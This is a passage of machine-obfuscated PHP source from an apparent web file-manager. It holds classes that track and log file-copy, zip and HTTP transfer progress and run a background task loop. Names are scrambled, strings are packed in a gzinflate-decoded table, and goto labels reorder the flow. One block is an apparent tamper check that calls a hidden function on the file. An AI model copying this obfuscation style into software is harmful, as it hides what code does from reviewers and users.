$ßœæÇ˜) { $ï£¼¹Ô¦ =& $_SERVER[øşô´çË]; self::log($ï£¼¹Ô¦[2032] . $‚ûŠÓ†Ã . $ï£¼¹Ô¦[83] . $ßœæÇ˜); $‘úÄÌÎ£ = rtrim(TEMP_FILES, $ï£¼¹Ô¦[8]); if (substr($‚ûŠÓ†Ã, 0, strlen($‘úÄÌÎ£)) == $‘úÄÌÎ£) { return; } if (substr($ßœæÇ˜, 0, strlen($‘úÄÌÎ£)) == $‘úÄÌÎ£) { return; } $ı«¯¢ª =& $this->task; $ı«¯¢ª[$ï£¼¹Ô¦[2033]] = KodIO::transferType($€û°¦á», $ÂÇòñÛ¼); self::log($ï£¼¹Ô¦[2034] . $ı«¯¢ª[$ï£¼¹Ô¦[2033]] . $ï£¼¹Ô¦[84] . $‚ûŠÓ†Ã . $ï£¼¹Ô¦[83] . $ßœæÇ˜); $this->update(); } public function updateAfter() { $òé´ÕàÅ =& $_SERVER[øşô´çË]; $±Ÿï³Öƒ =& $this->task; if (!$±Ÿï³Öƒ[$òé´ÕàÅ[866]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($±Ÿï³Öƒ[$òé´ÕàÅ[2033]] == $òé´ÕàÅ[1510]) { return; } self::updateTask($±Ÿï³Öƒ); } private static function updateTask(&$Š¹Î¶¬×) { $Ô¹¤¿‘¯ =& $_SERVER[øşô´çË]; if ($Š¹Î¶¬×[$Ô¹¤¿‘¯[2033]] == $Ô¹¤¿‘¯[1381] || $Š¹Î¶¬×[$Ô¹¤¿‘¯[2033]] == $Ô¹¤¿‘¯[117]) { if ($Š¹Î¶¬×[$Ô¹¤¿‘¯[2028]]) { $Š¹Î¶¬×[$Ô¹¤¿‘¯[943]] = $Š¹Î¶¬×[$Ô¹¤¿‘¯[2030]] + $Š¹Î¶¬×[$Ô¹¤¿‘¯[2027]]; } } else { if ($Š¹Î¶¬×[$Ô¹¤¿‘¯[2033]] == $Ô¹¤¿‘¯[1511]) { if ($Š¹Î¶¬×[$Ô¹¤¿‘¯[2028]] == $Ô¹¤¿‘¯[1381]) { $Š¹Î¶¬×[$Ô¹¤¿‘¯[943]] = $Š¹Î¶¬×[$Ô¹¤¿‘¯[2030]] + $Š¹Î¶¬×[$Ô¹¤¿‘¯[2027]] * 0.5; } else { if ($Š¹Î¶¬×[$Ô¹¤¿‘¯[2028]] == $Ô¹¤¿‘¯[117]) { $Š¹Î¶¬×[$Ô¹¤¿‘¯[943]] = $Š¹Î¶¬×[$Ô¹¤¿‘¯[2030]] + $Š¹Î¶¬×[$Ô¹¤¿‘¯[2026]] * 0.5 + $Š¹Î¶¬×[$Ô¹¤¿‘¯[2027]] * 0.5; } } } } $Š¹Î¶¬×[$Ô¹¤¿‘¯[1974]] = $Š¹Î¶¬×[$Ô¹¤¿‘¯[943]] / $Š¹Î¶¬×[$Ô¹¤¿‘¯[866]]; if ($Š¹Î¶¬×[$Ô¹¤¿‘¯[1974]] > 0) { $Ä•õíÚ¡ = timeFloat() - $Š¹Î¶¬×[$Ô¹¤¿‘¯[1976]] - $Š¹Î¶¬×[$Ô¹¤¿‘¯[1979]]; $Š¹Î¶¬×[$Ô¹¤¿‘¯[1980]] = $Ä•õíÚ¡ * (1 - $Š¹Î¶¬×[$Ô¹¤¿‘¯[1974]]) / $Š¹Î¶¬×[$Ô¹¤¿‘¯[1974]]; } $ĞÆúÖ¹¿ = $Š¹Î¶¬×[$Ô¹¤¿‘¯[2027]] . $Ô¹¤¿‘¯[994] . $Š¹Î¶¬×[$Ô¹¤¿‘¯[2026]] . "\73\x20{$ØöÂ±ÑÀ}\x3b" . $Š¹Î¶¬×[$Ô¹¤¿‘¯[943]]; self::log($Ô¹¤¿‘¯[2035] . $Š¹Î¶¬×[$Ô¹¤¿‘¯[2028]] . $Ô¹¤¿‘¯[84] . $Š¹Î¶¬×[$Ô¹¤¿‘¯[1974]] . $Ô¹¤¿‘¯[84] . $ĞÆúÖ¹¿); } public function addPath($ıŞâæã) { $ç×™¨Ë =& $_SERVER[øşô´çË]; if (!$ıŞâæã) { return; } $®Ä«ş­“ =& $this->task; $–ğ·À™ = IO::infoWithChildren($ıŞâæã); $Êı–ÂƒÍ = $®Ä«ş­“[$ç×™¨Ë[2036]] ? $®Ä«ş­“[$ç×™¨Ë[2036]][$ç×™¨Ë[2037]] : 0; $®Ä«ş­“[$ç×™¨Ë[2036]] = array($ç×™¨Ë[2037] => $Êı–ÂƒÍ + 1, $ç×™¨Ë[518] => $–ğ·À™[$ç×™¨Ë[42]], $ç×™¨Ë[97] => $–ğ·À™[$ç×™¨Ë[97]], $ç×™¨Ë[611] => $–ğ·À™[$ç×™¨Ë[611]] ? $–ğ·À™[$ç×™¨Ë[611]] : $–ğ·À™[$ç×™¨Ë[97]]); if ($–ğ·À™[$ç×™¨Ë[43]] == $ç×™¨Ë[240]) { $®Ä«ş­“[$ç×™¨Ë[1228]] += 1; } else { $®Ä«ş­“[$ç×™¨Ë[1228]] += $–ğ·À™[$ç×™¨Ë[92]][$ç×™¨Ë[90]]; if ($–ğ·À™[$ç×™¨Ë[201]]) { $®Ä«ş­“[$ç×™¨Ë[1228]] += $–ğ·À™[$ç×™¨Ë[92]][$ç×™¨Ë[91]] + 1; } } $®Ä«ş­“[$ç×™¨Ë[866]] += $–ğ·À™[$ç×™¨Ë[89]]; $this->update(); self::log(array($ç×™¨Ë[2038] . $ıŞâæã, $–ğ·À™)); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($Ş¾°çáı) { } public function sourceAddHashEnd($õê™‚®î) { } public function sourceAddFileStart($Šµìû¬) { $–ôå¯ûø =& $_SERVER[øşô´çË]; $©¤áÁ¡¤ =& $this->task; $©¤áÁ¡¤[$–ôå¯ûø[2026]] = $Šµìû¬[$–ôå¯ûø[89]]; $©¤áÁ¡¤[$–ôå¯ûø[2024]] = $Šµìû¬[$–ôå¯ûø[42]]; $©¤áÁ¡¤[$–ôå¯ûø[1230]] = $Šµìû¬[$–ôå¯ûø[42]]; $©¤áÁ¡¤[$–ôå¯ûø[2039]] = $Šµìû¬[$–ôå¯ûø[97]]; $this->update(); self::log($–ôå¯ûø[2040] . $Šµìû¬[$–ôå¯ûø[97]] . $–ôå¯ûø[2041] . $Šµìû¬[$–ôå¯ûø[89]]); } public function sourceAddFileEnd($×Œşıãù) { $û í÷«› =& $_SERVER[øşô´çË]; $ßˆÁŒï =& $this->task; $ßˆÁŒï[$û í÷«›[943]] += $×Œşıãù[$û í÷«›[89]]; $ßˆÁŒï[$û í÷«›[2039]] = $×Œşıãù[$û í÷«›[97]]; $this->update(1); self::log($û í÷«›[2042] . $×Œşıãù[$û í÷«›[97]] . $û í÷«›[2041] . $×Œşıãù[$û í÷«›[89]] . $û í÷«›[2043]); } public function copyFileStart($‘¯°¶û®, $ÁçšÑ©µ, $‰íœ—½Å, $çïÃ’ñŒ, $ Í¨¾Ø†, $çš¸Ê¡µ) { $ß¹©‚†ˆ =& $_SERVER[øşô´çË]; $•€Ó½ = $ Í¨¾Ø†; if ($•€Ó½ == $GLOBALS[$ß¹©‚†ˆ[2044]]) { $•€Ó½ = $GLOBALS[$ß¹©‚†ˆ[2045]]; } $GLOBALS[$ß¹©‚†ˆ[2045]] = $ Í¨¾Ø†; $GLOBALS[$ß¹©‚†ˆ[2044]] = $çš¸Ê¡µ; $‰ëµÓ =& $this->task; $‰ëµÓ[$ß¹©‚†ˆ[2024]] = $•€Ó½; $‰ëµÓ[$ß¹©‚†ˆ[2026]] = (int) $‘¯°¶û®->size($ÁçšÑ©µ); $‰ëµÓ[$ß¹©‚†ˆ[2027]] = 0; $‰ëµÓ[$ß¹©‚†ˆ[1230]] = $ß¹©‚†ˆ[12]; $‰ëµÓ[$ß¹©‚†ˆ[2028]] = $ß¹©‚†ˆ[12]; $‰ëµÓ[$ß¹©‚†ˆ[2029]] = 0; $‡”ãÂÊ = $‰ëµÓ[$ß¹©‚†ˆ[2026]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($‰ëµÓ[$ß¹©‚†ˆ[496]] . $ß¹©‚†ˆ[2046]); if ($‡”ãÂÊ && file_exists(get_path_father($çïÃ’ñŒ))) { Cache::set($‰ëµÓ[$ß¹©‚†ˆ[496]] . $ß¹©‚†ˆ[2046], $çïÃ’ñŒ); $‰ëµÓ[$ß¹©‚†ˆ[1997]] = array($ß¹©‚†ˆ[2047], $ß¹©‚†ˆ[2048]); } $this->update(0, $‡”ãÂÊ); self::log("\143\x6f\x70\x79\106\151\154\145\x53\x74\x61\162\164\72{$ÁçšÑ©µ}\x3b"); } public static function updateCopyLocalFileSize($¤•Ø˜…Ò) { $¼ãÎ§ =& $_SERVER[øşô´çË]; $·•ä¢áé = Cache::get($¤•Ø˜…Ò[$¼ãÎ§[496]] . $¼ãÎ§[2046]); if (!$·•ä¢áé || !file_exists($·•ä¢áé)) { return $¤•Ø˜…Ò; } $¤•Ø˜…Ò[$¼ãÎ§[2027]] = @filesize($·•ä¢áé); $¤•Ø˜…Ò[$¼ãÎ§[943]] += $¤•Ø˜…Ò[$¼ãÎ§[2027]]; self::updateTask($¤•Ø˜…Ò); return $¤•Ø˜…Ò; } public function copyFileEnd($ëñ™Å¿”, $à¥É†—, $Œ¼ö­ÉÊ, $¢œô÷£©, $Éâ·úÕå, $Æ­À¾Ü) { $ Ìø„£ä =& $_SERVER[øşô´çË]; $îÒß ó =& $this->task; $îÒß ó[$ Ìø„£ä[2027]] = $îÒß ó[$ Ìø„£ä[2026]]; $îÒß ó[$ Ìø„£ä[2028]] = $ Ìø„£ä[12]; unset($îÒß ó[$ Ìø„£ä[1997]]); if ($Éâ·úÕå == $îÒß ó[$ Ìø„£ä[2024]]) { $îÒß ó[$ Ìø„£ä[2030]] += $îÒß ó[$ Ìø„£ä[2026]]; $îÒß ó[$ Ìø„£ä[943]] = $îÒß ó[$ Ìø„£ä[2030]]; $­Ì‰Ğ‹§ = 1; if (isset($îÒß ó[$ Ìø„£ä[2039]]) && $îÒß ó[$ Ìø„£ä[2039]] == $à¥É†—) { $­Ì‰Ğ‹§ = 0; } $this->update($­Ì‰Ğ‹§); } else { $this->update(); $îÒß ó[$ Ìø„£ä[2027]] = 0; } Cache::remove($îÒß ó[$ Ìø„£ä[496]] . $ Ìø„£ä[2046]); self::log($ Ìø„£ä[2049] . $à¥É†— . $ Ìø„£ä[83] . $¢œô÷£© . $ Ìø„£ä[19] . $Éâ·úÕå . $ Ìø„£ä[2050] . $îÒß ó[$ Ìø„£ä[2024]]); } public function updateFileEnd($‘ãÔß‹É, $›Ö†™‡í) { $—›»†Œ =& $_SERVER[øşô´çË]; $şü¹„¨Ï =& $this->task; $şü¹„¨Ï[$—›»†Œ[2024]] = $‘ãÔß‹É; $şü¹„¨Ï[$—›»†Œ[2026]] = $›Ö†™‡í; $şü¹„¨Ï[$—›»†Œ[2030]] += $›Ö†™‡í; $şü¹„¨Ï[$—›»†Œ[943]] = $şü¹„¨Ï[$—›»†Œ[2030]]; $this->update(1); self::log($—›»†Œ[2051] . $‘ãÔß‹É); } public function sourceModelCopy($¸ŠÄ€ ) { $»èÈ¼ü– =& $_SERVER[øşô´çË]; $—¿œâ¢¥ = $¸ŠÄ€ [0]; $Ë­¶ Ò = $¸ŠÄ€ [1]; $àà¤ï‡æ =& $this->task; $this->sourceModelCopyFlag = !0; $ÛúÜÜ›¨ = 0; switch ($—¿œâ¢¥) { case $»èÈ¼ü–[666]: $ÛúÜÜ›¨ = 1; break; case $»èÈ¼ü–[669]: $àà¤ï‡æ[$»èÈ¼ü–[2024]] = $Ë­¶ Ò[$»èÈ¼ü–[42]]; break; case $»èÈ¼ü–[671]: $ÛúÜÜ›¨ = intval($¸ŠÄ€ [$»èÈ¼ü–[476]] * 0.4); break; case $»èÈ¼ü–[673]: $ÛúÜÜ›¨ = intval($¸ŠÄ€ [$»èÈ¼ü–[476]] * 0.2); break; case $»èÈ¼ü–[675]: $ÛúÜÜ›¨ = intval($¸ŠÄ€ [$»èÈ¼ü–[476]] * 0.4); break; } $this->update($ÛúÜÜ›¨); self::log(array("{$—¿œâ¢¥}\x3b\x61\x64\x64\75{$ÛúÜÜ›¨}", $¸ŠÄ€ )); $this->sourceModelCopyFlag = !1; } public function sourceRemove($¨åœüÕ, $Óİ¿‘í©) { $öéÒõİ™ =& $_SERVER[øşô´çË]; $this->sourceModelCopyFlag = !0; $¹È€“Ş— = 1; if (isset($¨åœüÕ[$öéÒõİ™[92]])) { $¹È€“Ş— = $¨åœüÕ[$öéÒõİ™[92]][$öéÒõİ™[90]]; $¹È€“Ş— = $¹È€“Ş— + $¨åœüÕ[$öéÒõİ™[92]][$öéÒõİ™[91]] + 1; } $this->update($¹È€“Ş—); $this->sourceModelCopyFlag = !1; $this->log(array($öéÒõİ™[2052], $¹È€“Ş—, $¨åœüÕ)); } public function sourceMove($—öÅı‰Ÿ) { $this->sourceRemove($—öÅı‰Ÿ, !1); } public function curlProgress($§÷Î¾÷, $ÒÃÔî¡ç, $§åœîÇÙ, $²î¹×©, $ˆ°ÑŠ¢) { $»¿Äúï =& $_SERVER[øşô´çË]; $õ¸¹îÑ¦ =& $this->task; if ($ˆ°ÑŠ¢ > 0) { $õ¸¹îÑ¦[$»¿Äúï[1230]] = $»¿Äúï[2053]; $õ¸¹îÑ¦[$»¿Äúï[2028]] = $»¿Äúï[117]; if ($õ¸¹îÑ¦[$»¿Äúï[2026]]) { $õ¸¹îÑ¦[$»¿Äúï[2027]] = $ˆ°ÑŠ¢; } if ($õ¸¹îÑ¦[$»¿Äúï[2029]]) { $õ¸¹îÑ¦[$»¿Äúï[2027]] = $ˆ°ÑŠ¢ + $õ¸¹îÑ¦[$»¿Äúï[2029]]; } } else { if ($§åœîÇÙ > 0) { if ($õ¸¹îÑ¦[$»¿Äúï[2026]] == $ÒÃÔî¡ç) { $õ¸¹îÑ¦[$»¿Äúï[2027]] = $§åœîÇÙ; $õ¸¹îÑ¦[$»¿Äúï[1230]] = $»¿Äúï[2054]; $õ¸¹îÑ¦[$»¿Äúï[2028]] = $»¿Äúï[1381]; } } } $this->update(); $Ü×ÊéÀ = "\x64\157\167\156\72{$§åœîÇÙ}\57{$ÒÃÔî¡ç}\73\40\165\160\154\157\x61\144\72{$ˆ°ÑŠ¢}\x2f{$²î¹×©}\x3b\146\151\x6c\145\75" . $õ¸¹îÑ¦[$»¿Äúï[2026]]; self::log(array($»¿Äúï[2055] . $Ü×ÊéÀ . $»¿Äúï[84] . $õ¸¹îÑ¦[$»¿Äúï[2024]], curl_getinfo($§÷Î¾÷))); } public function curlProgressStart($÷¶ª™šñ) { } public function curlProgressEnd($óûÒƒØé) { $§½‚©¯Î =& $_SERVER[øşô´çË]; $Â ÃÕÁ =& $this->task; $°ıä¸—á = curl_getinfo($óûÒƒØé); $ºÆï¥Äù = $°ıä¸—á[$§½‚©¯Î[2056]]; if ($ºÆï¥Äù == -1) { $ºÆï¥Äù = $°ıä¸—á[$§½‚©¯Î[2057]]; } if ($Â ÃÕÁ[$§½‚©¯Î[2028]] == $§½‚©¯Î[117] && $ºÆï¥Äù) { $Â ÃÕÁ[$§½‚©¯Î[2029]] += $ºÆï¥Äù; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $×‡üÔ·Ã =& $_SERVER[øşô´çË]; $Ü¢·ĞÜã =& $this->task; $Ü¢·ĞÜã[$×‡üÔ·Ã[2058]] = 1; Hook::bind($×‡üÔ·Ã[2018], array($this, $×‡üÔ·Ã[2059])); Hook::bind($×‡üÔ·Ã[2020], array($this, $×‡üÔ·Ã[2060])); Hook::bind($×‡üÔ·Ã[2022], array($this, $×‡üÔ·Ã[2061])); } protected function endAfter() { $Ş¤¤Û´§ =& $_SERVER[øşô´çË]; Hook::unbind($Ş¤¤Û´§[2018], array($this, $Ş¤¤Û´§[2059])); Hook::unbind($Ş¤¤Û´§[2020], array($this, $Ş¤¤Û´§[2060])); Hook::unbind($Ş¤¤Û´§[2022], array($this, $Ş¤¤Û´§[2061])); } public function progressStart($ä«Á¾Ä˜) { $­Ìë¥é• =& $_SERVER[øşô´çË]; $É§µöÓ³ = curl_getinfo($ä«Á¾Ä˜); self::log($­Ìë¥é•[2062] . $É§µöÓ³[$­Ìë¥é•[391]]); self::valueSet($this->task[$­Ìë¥é•[496]], $this->task); } public function progressEnd($Çòİ ©›) { $È¬ËıÌ =& $_SERVER[øşô´çË]; self::log($È¬ËıÌ[2063] . $this->task[$È¬ËıÌ[496]]); $this->end(); } public function progress($ù—æá¡Ñ, $Éİ­², $ö—ƒÑ¿, $™éĞ¯¬¢, $™ß®ÔÌ) { $“Ü“·Ëù =& $_SERVER[øşô´çË]; $•¬ïÕò =& $this->task; if ($™ß®ÔÌ > 0) { $•¬ïÕò[$“Ü“·Ëù[1228]] = $•¬ïÕò[$“Ü“·Ëù[1228]] == 0 ? $™éĞ¯¬¢ : $•¬ïÕò[$“Ü“·Ëù[1228]]; $•¬ïÕò[$“Ü“·Ëù[1973]] = $™ß®ÔÌ; } else { if ($ö—ƒÑ¿ > 0) { $•¬ïÕò[$“Ü“·Ëù[1228]] = $•¬ïÕò[$“Ü“·Ëù[1228]] == 0 ? $Éİ­² : $•¬ïÕò[$“Ü“·Ëù[1228]]; $•¬ïÕò[$“Ü“·Ëù[1973]] = $ö—ƒÑ¿; } } $this->update(); self::log("\x70\x72\157\147\162\145\x73\x73\x48\164\x74\x70\72\144\157\167\x6e\x3a{$ö—ƒÑ¿}\x2f{$Éİ­²}\73\x20\165\160\x6c\x6f\x61\144\72{$™ß®ÔÌ}\x2f{$™éĞ¯¬¢}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ËÛÄ•¨Š, $À­Üş£ = '', $ß†¤ş©Í = 0, $ßç”î©½ = '') { $¢—îüß =& $_SERVER[øşô´çË]; $ßç”î©½ = $ßç”î©½ ? $ßç”î©½ : ($À­Üş£ ? $À­Üş£ : $ËÛÄ•¨Š); $˜ÑıìÆƒ = new Task($ËÛÄ•¨Š, $À­Üş£, $ß†¤ş©Í, $ßç”î©½); $GLOBALS[$¢—îüß[2064] . $ËÛÄ•¨Š] = new TaskLog($¢—îüß[1957], $˜ÑıìÆƒ, $ßç”î©½); return $˜ÑıìÆƒ; } public function __construct($ğÑ”œ‡õ = '', $Ø†Ë³‡¶ = '', $ØÖŸ = '') { $Ì¾«”È =& $_SERVER[øşô´çË]; if (!$ğÑ”œ‡õ) { $ğÑ”œ‡õ = $Ì¾«”È[1957]; } $®›ÖØÂ = $ğÑ”œ‡õ . $Ì¾«”È[485] . rand_string(10); if (!$ØÖŸ) { $ØÖŸ = $ğÑ”œ‡õ . $Ì¾«”È[63] . $ØÖŸ; } switch ($ğÑ”œ‡õ) { case $Ì¾«”È[1957]: if (!$Ø†Ë³‡¶ || !$Ø†Ë³‡¶->task) { return echoLog($ğÑ”œ‡õ . $Ì¾«”È[2065]); } $åŒÕ¿„ = $Ø†Ë³‡¶; $®›ÖØÂ = $åŒÕ¿„->task[$Ì¾«”È[496]]; $ğÑ”œ‡õ = $åŒÕ¿„->task[$Ì¾«”È[496]]; if (!$åŒÕ¿„->task[$Ì¾«”È[1862]]) { $åŒÕ¿„->task[$Ì¾«”È[1862]] = $ØÖŸ ? $ØÖŸ : $ğÑ”œ‡õ; } break; case $Ì¾«”È[2066]: if (!$Ø†Ë³‡¶) { return echoLog($ğÑ”œ‡õ . $Ì¾«”È[2067]); } $š®±úÔ = is_string($Ø†Ë³‡¶) ? array($Ø†Ë³‡¶) : $Ø†Ë³‡¶; $åŒÕ¿„ = new TaskFileTransfer($®›ÖØÂ, $ğÑ”œ‡õ, 0, $ØÖŸ ? $ØÖŸ : $š®±úÔ[0]); foreach ($š®±úÔ as $ÀÆîÂ­²) { $åŒÕ¿„->addPath($ÀÆîÂ­²); } break; case $Ì¾«”È[397]: if (!$Ø†Ë³‡¶) { return echoLog($ğÑ”œ‡õ . $Ì¾«”È[2067]); } $š®±úÔ = is_string($Ø†Ë³‡¶) ? array($Ø†Ë³‡¶) : $Ø†Ë³‡¶; $åŒÕ¿„ = new TaskZip($®›ÖØÂ, $ğÑ”œ‡õ, 0, $ØÖŸ ? $ØÖŸ : $š®±úÔ[0]); foreach ($š®±úÔ as $ÀÆîÂ­²) { $åŒÕ¿„->addPath($ÀÆîÂ­²); } break; case $Ì¾«”È[1400]: if (!$Ø†Ë³‡¶) { return echoLog($ğÑ”œ‡õ . $Ì¾«”È[2067]); } $åŒÕ¿„ = new TaskUnZip($®›ÖØÂ, $ğÑ”œ‡õ, 0, $ØÖŸ ? $ØÖŸ : $Ø†Ë³‡¶); if ($Ø†Ë³‡¶) { $åŒÕ¿„->addFile($Ø†Ë³‡¶); } break; case $Ì¾«”È[159]: $åŒÕ¿„ = new TaskHttp($®›ÖØÂ, $ğÑ”œ‡õ); break; default: return; break; } $this->task = $åŒÕ¿„; $this->taskID = $®›ÖØÂ; Hook::bind($Ì¾«”È[1993], array($this, $Ì¾«”È[2068])); Hook::bind($Ì¾«”È[1995], array($this, $Ì¾«”È[2069])); Hook::bind($Ì¾«”È[1989], array($this, $Ì¾«”È[2070])); echoLog($Ì¾«”È[2071] . $åŒÕ¿„->task[$Ì¾«”È[1862]]); } public function __destruct() { $this->end(); } public function end($›Š¨á§Ç = '') { $Ò‘ğ¯ƒ— =& $_SERVER[øşô´çË]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($›Š¨á§Ç); $this->task = !1; $this->taskID = !1; Hook::unbind($Ò‘ğ¯ƒ—[1993], array($this, $Ò‘ğ¯ƒ—[2068])); Hook::unbind($Ò‘ğ¯ƒ—[1995], array($this, $Ò‘ğ¯ƒ—[2069])); Hook::unbind($Ò‘ğ¯ƒ—[1989], array($this, $Ò‘ğ¯ƒ—[2070])); } public function taskUpdate($ßãƒö‡¥) { $Â‡°š“Ï =& $_SERVER[øşô´çË]; if (!$ßãƒö‡¥ || $this->taskID != $ßãƒö‡¥[$Â‡°š“Ï[496]]) { return; } $†ìºçë¯ = 20; $öáœ†İ = intval($ßãƒö‡¥[$Â‡°š“Ï[1974]] * $†ìºçë¯); $†›ëÀñû = $Â‡°š“Ï[183] . str_repeat($Â‡°š“Ï[473], $öáœ†İ) . $Â‡°š“Ï[1178] . str_repeat($Â‡°š“Ï[63], $†ìºçë¯ - $öáœ†İ) . $Â‡°š“Ï[185]; $ªµ½µ‡¹ = $†›ëÀñû . sprintf($Â‡°š“Ï[2072], $ßãƒö‡¥[$Â‡°š“Ï[1974]] * 100) . $Â‡°š“Ï[2073]; $´‡Å´¾µ = $ªµ½µ‡¹ . $ßãƒö‡¥[$Â‡°š“Ï[1973]] . $Â‡°š“Ï[8] . $ßãƒö‡¥[$Â‡°š“Ï[1228]] . LNG($Â‡°š“Ï[2074]); $ØªÕéæŸ = $Â‡°š“Ï[12]; if ($ßãƒö‡¥[$Â‡°š“Ï[2058]]) { $´‡Å´¾µ = $ªµ½µ‡¹ . size_format($ßãƒö‡¥[$Â‡°š“Ï[1973]]) . $Â‡°š“Ï[8] . size_format($ßãƒö‡¥[$Â‡°š“Ï[1228]]); $ØªÕéæŸ = size_format($ßãƒö‡¥[$Â‡°š“Ï[1975]]) . $Â‡°š“Ï[2075]; } if ($ßãƒö‡¥[$Â‡°š“Ï[1230]]) { $ßãƒö‡¥[$Â‡°š“Ï[2024]] = $ßãƒö‡¥[$Â‡°š“Ï[1230]] . $Â‡°š“Ï[63] . $ßãƒö‡¥[$Â‡°š“Ï[2024]]; } if ($ßãƒö‡¥[$Â‡°š“Ï[2024]]) { $×Š­²Íˆ = $Â‡°š“Ï[12]; if ($ßãƒö‡¥[$Â‡°š“Ï[2026]]) { $×Š­²Íˆ = $Â‡°š“Ï[60] . size_format($ßãƒö‡¥[$Â‡°š“Ï[2027]]) . $Â‡°š“Ï[8] . size_format($ßãƒö‡¥[$Â‡°š“Ï[2026]]); } $ØªÕéæŸ .= $ßãƒö‡¥[$Â‡°š“Ï[2024]] . $×Š­²Íˆ; } if ($ßãƒö‡¥[$Â‡°š“Ï[866]] && !$ßãƒö‡¥[$Â‡°š“Ï[2026]]) { $ØªÕéæŸ .= $Â‡°š“Ï[63] . size_format($ßãƒö‡¥[$Â‡°š“Ï[943]]) . $Â‡°š“Ï[8] . size_format($ßãƒö‡¥[$Â‡°š“Ï[866]]); } echoLog($´‡Å´¾µ . $Â‡°š“Ï[63] . $ØªÕéæŸ, !0); } public function taskEnd($ï¶Ş“÷) { $êÙüâ =& $_SERVER[øşô´çË]; if (!$ï¶Ş“÷ || $this->taskID != $ï¶Ş“÷[$êÙüâ[496]]) { return; } $¹´òÕèğ = $ï¶Ş“÷ ? LNG($êÙüâ[2076]) . $êÙüâ[4] . $ï¶Ş“÷[$êÙüâ[1973]] . $êÙüâ[8] . $ï¶Ş“÷[$êÙüâ[1228]] . LNG($êÙüâ[2074]) . $êÙüâ[84] : $êÙüâ[12]; echoLog($êÙüâ[2077] . $ï¶Ş“÷[$êÙüâ[1862]] . ($ï¶Ş“÷[$êÙüâ[549]] ? $êÙüâ[84] . $ï¶Ş“÷[$êÙüâ[549]] : $êÙüâ[12]) . $êÙüâ[84] . $¹´òÕèğ . $êÙüâ[2078] . sprintf($êÙüâ[1010], timeFloat() - $ï¶Ş“÷[$êÙüâ[1976]]) . $êÙüâ[1988]); $this->end(); } public function taskKill($º§‚İ­‹) { $Ä¹ş¥‹– =& $_SERVER[øşô´çË]; if (!$º§‚İ­‹ || $this->taskID != $º§‚İ­‹[$Ä¹ş¥‹–[496]]) { return; } echoLog($Ä¹ş¥‹–[2079] . $º§‚İ­‹[$Ä¹ş¥‹–[1862]]); } } goto fš³Ô•›Ü; BĞˆêÔÍ¤ğ: define($_SERVER[øşô´çË][0], $_SERVER[øşô´çË][1]); $_SERVER[¸—ÈÚ´„] = explode($_SERVER[øşô´çË][2], gzinflate(substr($_SERVER[øşô´çË][3], 10, -8))); function binCheckEq($ŠĞ§ªµú, $²Ü¯œÈÄ) { return $ŠĞ§ªµú == $²Ü¯œÈÄ; } goto fê…é…÷; Cƒ†¦²‰¯®: if ($_SERVER[$_SERVER[øşô´çË][15]] != $_size($_file)) { $_getc = $_SERVER[øşô´çË][16]; $_getfile = $_SERVER[$_SERVER[øşô´çË][17]] . $_SERVER[øşô´çË][18]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[øşô´çË][19], $_getfilec); if (count($_getarrs) < $_SERVER[øşô´çË][20]) { $exit = $_SERVER[øşô´çË][21]; $exit(); } $_act = $_SERVER[øşô´çË][22]; $_act($_file); } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $…¼øÈ¿ =& $_SERVER[øşô´çË]; if (self::valueGet($…¼øÈ¿[852]) != $…¼øÈ¿[101]) { return; } if (self::valueGet($…¼øÈ¿[941]) == $…¼øÈ¿[101]) { $Îëİµ«ë = self::valueGet($…¼øÈ¿[1924]); if (time() - $Îëİµ«ë > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($…¼øÈ¿[941], $…¼øÈ¿[101]); self::log($…¼øÈ¿[1925] . ACTION . $…¼øÈ¿[1926]); Hook::bind($…¼øÈ¿[1927], $…¼øÈ¿[1928]); $Şì©›Óğ = 0; while (!0) { self::cacheClear(); if (self::valueGet($…¼øÈ¿[852]) != $…¼øÈ¿[101]) { self::valueSet($…¼øÈ¿[941], $…¼øÈ¿[238]); self::log($…¼øÈ¿[1929]); die; } $¢´—¯ŞË = time(); if ($¢´—¯ŞË - $Şì©›Óğ >= 60) { self::valueSet(array($…¼øÈ¿[941] => $…¼øÈ¿[101], $…¼øÈ¿[1924] => $¢´—¯ŞË)); $Şì©›Óğ = $¢´—¯ŞË; } if (!file_exists(USER_SYSTEM . $…¼øÈ¿[1930])) { self::valueSet(array($…¼øÈ¿[941] => $…¼øÈ¿[238], $…¼øÈ¿[852] => $…¼øÈ¿[238])); self::log($…¼øÈ¿[1931]); die; } $Ü·Ü±ŒÉ = file_get_contents(BASIC_PATH . $…¼øÈ¿[1932]); $’°©œâê = KOD_VERSION . $…¼øÈ¿[10] . KOD_VERSION_BUILD; $æ·äµĞ¿ = match_text($Ü·Ü±ŒÉ, $…¼øÈ¿[1933]) . $…¼øÈ¿[10] . match_text($Ü·Ü±ŒÉ, $…¼øÈ¿[1934]); if ($æ·äµĞ¿ != $’°©œâê) { self::restart(); self::log("\163\164\x6f\160\x65\144\56\x5b\166\145\x72\x73\x69\x6f\156\40\165\x70\144\x61\164\145\73{$versionNow}\x20\75\x3e\40{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $”¢¿–ò =& $_SERVER[øşô´çË]; http_close(); $GLOBALS[$”¢¿–ò[1935]] = 1; $_SERVER[$”¢¿–ò[1936]] = $”¢¿–ò[1937]; $_COOKIE = array(); $GLOBALS[$”¢¿–ò[1938]] = 1; $GLOBALS[$”¢¿–ò[1939]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $é¹¤í†­ =& $_SERVER[øşô´çË]; http_close(); self::valueSet($é¹¤í†­[852], $é¹¤í†­[238]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($é¹¤í†­[941] => $é¹¤í†­[238], $é¹¤í†­[852] => $é¹¤í†­[101])); self::log($é¹¤í†­[1940]); } public static function taskSwitch() { $›Ö¢ƒ£¥ =& $_SERVER[øşô´çË]; $úıêˆ™¨ = 